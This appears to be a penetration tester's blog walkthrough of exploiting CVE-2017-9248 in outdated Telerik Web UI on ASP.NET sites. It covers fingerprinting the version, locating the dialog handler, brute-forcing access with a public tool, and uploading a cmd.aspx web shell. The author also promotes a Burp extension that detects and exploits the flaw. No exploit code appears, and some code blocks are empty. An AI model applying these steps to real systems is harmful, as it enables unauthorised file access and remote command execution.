## Introduction 

Over the past months, I’ve encountered a number of web applications that were using Telerik Web UI components for their application’s interface. There’s nothing wrong with using third party components to make your application’s interface the way you want it. However, a vulnerability in these components could cause you harm. 


In this post, I’m going to show you how I pwned several web applications, specifically ASP.NET ones, by abusing an outdated version of Telerik Web UI.  

## Identification

The simplest way to check if the application is using Telerik Web UI is to view its HTML source code. 
[![Source1](/static/img/2018-08-03-pwning-with-telerik/01.png)](/static/img/2018-08-03-pwning-with-telerik/01.png)
> _**TIP #1:** There are times where you’ll not find exactly the string **Telerik.Web.UI** from the HTML code. However, if you find the string **Telerik**, just keep on browsing the other pages of the application and search for the string **Telerik.Web.UI** again._


If you’ve identified that the application is using Telerik Web UI, the next step is to identify its version and check if it’s vulnerable to [**CVE-2017-9248**](https://www.telerik.com/support/kb/aspnet-ajax/details/cryptographic-weakness).  


Finding the version can either be easy or tricky. To get the exact version, just view the HTML code. In the case below, the version information sits right next to the string **Telerik.Web.UI**. That’s easy.

However, there are cases where the version is not located right next to the string “**Telerik.Web.UI**”. Another way to identify the version of Telerik Web UI is by going through the HTML comments just like here.

Once you have the version information, cross-reference it with the list of vulnerable versions. Based on the [exploitation tool](https://github.com/bao7uo/dp_crypto) written by Paul Taylor ([@bao7uo](https://twitter.com/bao7uo)), the following versions are affected:

```

## Exploitation

Before jumping to the exploitation, we have to locate first the "Dialog Handler" **Telerik.Web.UI.DialogHandler.aspx**. Most of the time, it’s located at the root directory of the application. If it’s not there, try the sub-directories. To verify if you’ve found the right location, you should see the string "**Loading the dialog…**" when accessing the dialog handler.
[![Loading](/static/img/2018-08-03-pwning-with-telerik/04.png)](/static/img/2018-08-03-pwning-with-telerik/04.png)
> _**TIP #2:** Sometimes, the sub-directory where the dialog handler is located (or where Telerik Web UI is located in general) can be found from the HTML source code._

For the exploitation, use the tool written by Paul Taylor which can be downloaded [here](https://github.com/bao7uo/dp_crypto). Credits and big thanks to him for writing this one. 


Here’s an example of the tool running to bruteforce the key and discover the hidden link to access the **Document Manager** page.
```console

```

By visiting the "**Document Manager**" link, we see that we now have access to all the files and folders of the web server. More importantly, we see that we can upload arbitrary files to the server.

Here’s an example of the shell **cmd.aspx** file that I uploaded.

And here’s an example of a command execution using the uploaded shell.

## Telewreck

As part of my learning process, I decided to create a Burp Suite extension that can detect and exploit vulnerable instances of Telerik Web UI. I named it **Telewreck** and is available at [https://github.com/capt-meelo/Telewreck](https://github.com/capt-meelo/Telewreck). 

When running a passive scan, this extension will look for vulnerable versions of Telerik Web UI.
[![Passive](/static/img/2018-08-03-pwning-with-telerik/08.png)](/static/img/2018-08-03-pwning-with-telerik/08.png)

A tab where you can perform the exploitation part is also available.

That's it! 

Feel free to contribute in the development of the tool and report/fix some issues.
